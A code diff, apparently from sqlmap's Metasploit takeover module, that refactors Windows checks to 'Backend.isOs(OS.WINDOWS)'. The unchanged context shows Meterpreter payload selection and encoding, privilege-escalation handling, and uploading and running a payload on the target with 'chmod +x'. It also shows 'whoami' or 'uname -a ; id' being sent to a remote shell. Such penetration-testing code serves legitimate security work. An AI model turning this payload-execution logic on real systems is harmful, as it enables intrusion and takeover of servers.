@@ -32,6 +32,7 @@ from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.enums import DBMS
+from lib.core.enums import OS
 from lib.core.exception import sqlmapDataException
 from lib.core.exception import sqlmapFilePathException
 from lib.core.settings import UNICODE_ENCODING
@@ -118,7 +119,7 @@ class Metasploit:
                                     }
 
     def __skeletonSelection(self, msg, lst=None, maxValue=1, default=1):
-        if kb.os == "Windows":
+        if Backend.isOs(OS.WINDOWS):
             opSys = "windows"
         else:
             opSys = "linux"
@@ -169,11 +170,11 @@ class Metasploit:
         if isinstance(encode, basestring):
             return encode
 
-        elif kb.os == "Windows" and encode:
+        elif Backend.isOs(OS.WINDOWS) and encode:
             return self.__skeletonSelection("payload encoding", self.__msfEncodersList)
 
     def __selectPayload(self):
-        if kb.os == "Windows" and conf.privEsc:
+        if Backend.isOs(OS.WINDOWS) and conf.privEsc:
             infoMsg  = "forcing Metasploit payload to Meterpreter because "
             infoMsg += "it is the only payload that can be used to "
             infoMsg += "escalate privileges, either via 'incognito' "
@@ -358,7 +359,7 @@ class Metasploit:
         elif not self.connectionStr.startswith("bind"):
             raise sqlmapDataException, "unexpected connection type"
 
-        if kb.os == "Windows" or extra == "BufferRegister=EAX":
+        if Backend.isOs(OS.WINDOWS) or extra == "BufferRegister=EAX":
             self.__payloadCmd += " R | %s -a x86 -e %s -o %s -t %s" % (self.__msfEncode, self.encoderStr, outFile, format)
 
             if extra is not None:
@@ -395,7 +396,7 @@ class Metasploit:
         infoMsg += "remotely, please wait.."
         logger.info(infoMsg)
 
-        if kb.os != "Windows":
+        if not Backend.isOs(OS.WINDOWS):
             self.execCmd("chmod +x %s" % self.exeFilePathRemote, silent=True)
 
         cmd = "%s &" % self.exeFilePathRemote
@@ -403,7 +404,7 @@ class Metasploit:
         self.execCmd(cmd, silent=True)
 
     def __loadMetExtensions(self, proc, metSess):
-        if kb.os != "Windows":
+        if not Backend.isOs(OS.WINDOWS):
             return
 
         if self.resourceFile is not None:
@@ -479,7 +480,7 @@ class Metasploit:
                         func()
 
                     if "Starting the payload handler" in out and "shell" in self.payloadStr:
-                        if kb.os == "Windows":
+                        if Backend.isOs(OS.WINDOWS):
                             proc.stdin.write("whoami\n")
                         else:
                             proc.stdin.write("uname -a ; id\n")
@@ -512,7 +513,7 @@ class Metasploit:
         pollProcess(process)
         payloadStderr = process.communicate()[1]
 
-        if kb.os == "Windows" or extra == "BufferRegister=EAX":
+        if Backend.isOs(OS.WINDOWS) or extra == "BufferRegister=EAX":
             payloadSize = re.search("size ([\d]+)", payloadStderr, re.I)
         else:
             payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)
@@ -547,7 +548,7 @@ class Metasploit:
 
         self.__randStr = randomStr(lowercase=True)
 
-        if kb.os == "Windows":
+        if Backend.isOs(OS.WINDOWS):
             self.exeFilePathLocal = os.path.join(conf.outputPath, "tmpm%s.exe" % self.__randStr)
 
             # Metasploit developers added support for the old exe format
@@ -579,7 +580,7 @@ class Metasploit:
         pollProcess(process)
         payloadStderr = process.communicate()[1]
 
-        if kb.os == "Windows":
+        if Backend.isOs(OS.WINDOWS):
             payloadSize = re.search("size\s([\d]+)", payloadStderr, re.I)
         else:
             payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)
